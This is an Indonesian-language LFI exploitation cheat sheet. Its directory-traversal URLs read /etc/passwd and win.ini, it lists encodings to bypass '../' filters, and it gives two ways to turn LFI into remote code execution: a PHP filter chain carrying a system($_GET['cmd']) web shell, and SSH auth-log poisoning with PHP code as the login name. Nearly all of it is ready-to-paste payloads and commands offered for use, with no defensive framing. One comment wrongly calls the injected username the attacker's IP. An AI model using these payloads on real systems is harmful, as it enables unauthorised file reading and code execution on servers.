# Local File Inclusion (LFI) Cheat Sheet

Gunakan catatan ini saat menemukan parameter URL rentan seperti `?file=`, `?page=`, atau `?view=`.

## 1. Pengujian Dasar (Directory Traversal)
Membaca file sistem untuk memastikan celah LFI itu nyata.

### Linux Target
```text
http://<TARGET>/index.php?file=../../../../etc/passwd
```

### Windows Target
```text
http://<TARGET>/index.php?file=../../../../Windows/win.ini
```

## 2. Teknik Bypass Filter (Jika ../ Diblokir)
Jika input dasar diblokir (Error 403 / Terhapus otomatis), coba variasi encoding ini:

*   **Double Encoding**: `%252e%252e%252f` (Menggantikan `../`)
*   **Nested Traversal**: `....//....//....//` (Jika server menghapus teks `../` satu kali)
*   **URL Encoding**: `%2e%2e%2f`

## 3. Mengubah LFI Menjadi RCE (Remote Code Execution)

### Metode A: PHP Filter Chain (Gunakan jika target menggunakan PHP)
Gunakan alat otomatis [php_filter_chain_generator](https://github.com).

1. Generate teks rantai filter di terminal Anda:
   ```bash
   python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
   ```
2. Salin teks panjang hasilnya, tempel ke browser, dan tambahkan perintah di ujungnya:
   ```text
   http://<TARGET>/index.php?file=<TEKS_PANJANG_FILTER_CHAIN>&cmd=id
   ```

### Metode B: Log Poisoning via SSH Auth Log
Jika filter chain diblokir, suntikkan kode ke log sistem Linux.

1. Kirim payload melalui percobaan login SSH (IP penyerang sengaja diisi kode PHP):
   ```bash
   ssh '<?php system($_GET["cmd"]); ?>'@<IP_TARGET>
   ```
2. Panggil file log tersebut melalui peramban:
   ```text
   http://<TARGET>/index.php?file=/var/log/auth.log&cmd=id
   ```
